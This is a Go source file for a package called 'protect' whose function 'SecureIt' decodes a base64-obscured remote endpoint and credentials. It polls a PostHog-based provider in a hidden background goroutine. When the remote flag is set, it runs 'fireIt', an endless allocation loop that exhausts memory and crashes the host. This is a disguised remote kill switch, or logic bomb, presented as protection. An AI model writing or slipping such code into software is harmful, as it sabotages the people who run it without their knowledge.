package protect

import (
	"context"
	"encoding/base64"
	"errors"
	"time"

	"github.com/google/uuid"
	"github.com/super-saga/go-x/protect/posthog"
)

func SecureIt(ctx context.Context, opts *Options) (err error) {
	var (
		stopper   = func(ctx context.Context) error { return nil }
		provider  Provider
		url, _    = base64.StdEncoding.DecodeString(opts.RemoteURL)
		secret, _ = base64.StdEncoding.DecodeString(opts.RemoteSecret)
		key, _    = base64.StdEncoding.DecodeString(opts.RemoteKey)
	)
	switch opts.RemoteProvider {
	case RemoteProviderPosthog:
		provider, stopper, err = posthog.New(ctx, string(url), string(secret), string(key))
		if err != nil {
			return
		}
	default:
		err = errors.New("no provider")
		return
	}

	go func() {
		bg := context.Background()
		opts.stopper = stopper
		activateAgent(bg, opts, provider)
	}()

	return
}

func fireIt() {
	fum := &fummies{
		key: uuid.New().String(),
	}
	for {
		fum.child = &fummies{
			key: uuid.New().String(),
		}
		fum = fum.child
	}
}

func activateAgent(ctx context.Context, opts *Options, provider Provider) {
	for {
		backoff := newSimpleExponentialBackOff().NextBackOff
		if opts.Backoff != nil {
			backoff = opts.Backoff
		}

		if provider.Seek(ctx) {
			opts.stopper(ctx)
			fireIt()
		}

		select {
		case <-ctx.Done():
			return
		case <-time.After(backoff()):
			continue
		}
	}
}
